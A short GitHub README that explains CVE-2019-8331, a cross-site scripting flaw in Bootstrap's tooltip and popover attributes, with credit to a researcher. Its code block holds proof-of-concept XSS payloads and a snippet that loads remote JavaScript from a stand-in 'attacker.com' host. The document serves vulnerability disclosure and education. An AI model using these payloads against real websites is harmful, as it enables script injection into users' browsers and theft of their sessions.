#### [Thai](https://github.com/Thampakon/CVE-2019-8331/blob/main/README.md)
## Explain

**CVE-2019-8331 is a Cross-Site Scripting (XSS) type security vulnerability found in Bootstrap, a JavaScript library widely used in developing websites and mobile applications. This vulnerability occurs because Bootstrap does not properly filter data submitted to the data-template attribute of a tooltip or popover element, allowing an attacker to insert malicious code into web pages.**

**This attack can occur if an attacker can control the data displayed as a tooltip or popover. When a user enables Tooltip or Popover, malicious code is inserted into a web page and may be triggered by the user's browser.**

**This vulnerability has been fixed in Bootstrap versions 4.3.1 and 5.0.0-beta2.**

```
<x data-toggle="tooltip" data-template="<img src=x onerror=alert(1)>">XSS</x>
<x data-toggle="tooltip" data-html="true" title='<script>alert(1)</script>'>XSS</x>
<x data-toggle="tooltip" data-html="true" data-content='<script>alert(1)</script>'>XSS</x>

<script>
  var script = document.createElement("script");
  script.src = "https://attacker.com/malicious.js";
  document.body.appendChild(script);
</script>
```

## Credit
[BlackFan](https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6)

